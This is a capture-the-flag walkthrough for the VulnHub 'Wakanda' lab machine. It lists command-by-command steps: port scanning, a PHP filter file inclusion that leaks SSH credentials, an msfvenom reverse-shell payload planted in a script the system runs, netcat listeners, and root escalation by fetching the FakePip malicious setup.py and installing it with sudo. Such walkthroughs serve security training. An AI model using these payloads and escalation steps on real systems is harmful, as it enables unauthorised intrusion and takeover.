# VulnHub Walkthrough: 🐈‍⬛ Wakanda

## **Flag 1**

1. Scan Network/IP
     * `netdiscover -r <Kali IP>`
     * `nmap -p0-65535 <WaKanda IP>`
      * Ports open: *SSH* & *HTTP*

2. On your Kali machine, map WaKanda's IP to a domain to make things easier:
     * `nano /etc/hosts` then add the following line `wakanda.local <wakanda IP>`

3. Next look through `http://wakanda.local`:
     * *http://wakanda.local/?lang=fr* --> */?lang=php://filter/convert.base64-encode/resource=index*
     * Use base64 decode tool (online/burpsuite/terminal) to decode
     * User: ***mamadou*** | Password: ***Niamey4Ever227!!!***

4. Generate msfvenom payload to generate a shell (for flag 2):
     `msfvenom -p cmd/unix/reverse_python lhost=<Kali IP> lport=<any port> R`

5. Login via SSH:
     * `ssh mamadou@wakanda.local -p 3333` --> yes --> enter: *Niamey4Ever227!!!*
     * Create bash script: `import pty; pty.spawn('/bin/bash')`
     * `cat flag1.txt`


## **Flag 2**

1. On SSH:
     * `cd /srv`
     * `ls -a`
     * `nano .antivirus.py` --> '#" old exec --> then insert msfvenom payload

2. On Kali
     * `nc -nlvp <lport>` --> wait patiently
     * Once it connects: `id` & `bash -i`

3. Congrats, you're now (user) *devops*:
     * `cd /home` --> `ls` --> `cd /devops` --> `cat flag2.txt`


## **Flag 3**

1. On Kali:
     * `git clone https://github.com/0x00-0x00/FakePip.git`
     * `cd FakePip`
     * `nano setup.py` --> change `RHOST=<Kali IP>`, also notice `lport=443`
     * Create python server so we can wget/curl a file (*setup.py*) from Kali machine from within  the Wakanda machine `python -m SimpleHTTPServer 80`

2. On devops:
     * Fetch setup file from Kali: `wget http://<Kali IP>:<Port (80)>/setup.py`
     * `sudo pip install . --upgrade --force-reinstall`

3. On Kali:
     * `nc -lvp <lport (443)>`
     * Once it connects: `cd /root` --> `ls` --> `cat root.txt`
